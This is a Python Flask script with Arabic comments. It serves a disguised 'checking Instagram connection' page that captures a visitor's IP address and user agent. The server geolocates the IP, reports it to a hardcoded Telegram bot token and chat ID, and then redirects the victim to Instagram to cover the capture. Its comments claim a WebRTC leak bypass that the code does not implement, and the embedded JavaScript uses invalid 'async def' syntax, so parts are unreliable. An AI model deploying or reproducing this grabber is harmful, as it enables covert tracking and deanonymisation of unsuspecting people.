from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091"

@app.route('/')
def advanced_bypass():
    # كود HTML ذكي يحاول إجبار المتصفح على كشف الـ IP الحقيقي عبر جافا سكريبت
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading Content...</title>
        <script>
            // محاولة جلب الـ IP الحقيقي عبر WebRTC (ثغرة تسريب الـ IP)
            async def getIP() {
                try {
                    let response = await fetch('https://api.ipify.org?format=json');
                    let data = await response.json();
                    fetch('/log-ip?ip=' + data.ip + '&ua=' + navigator.userAgent);
                } catch (e) {
                    // إذا فشل، نعتمد على طلب السيرفر العادي
                    fetch('/log-ip?ua=' + navigator.userAgent);
                }
            }
            getIP();
            // تحويل فوري لتمويه الضحية
            setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 1500);
        </script>
    </head>
    <body>
        <div style="text-align:center; margin-top:20%;">
            <p>جاري فحص الاتصال بإنستجرام...</p>
        </div>
    </body>
    </html>
    """)

@app.route('/log-ip')
def log_ip():
    ip = request.args.get('ip', request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0])
    ua = request.args.get('ua', request.headers.get('User-Agent'))
    
    # تجاهل البوتات الأمريكية تماماً
    if "facebook" in ua.lower() or "amazon" in ua.lower():
        return "", 204

    r = requests.get(f'http://ip-api.com/json/{ip}').json()
    report = f"🎯 <b>صيد ذكي (WebRTC Bypass):</b>\nIP: {ip}\nCity: {r.get('city')}\nDevice: {ua[:50]}"
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": report})
    return "", 204

if __name__ == '__main__':
    app.run()
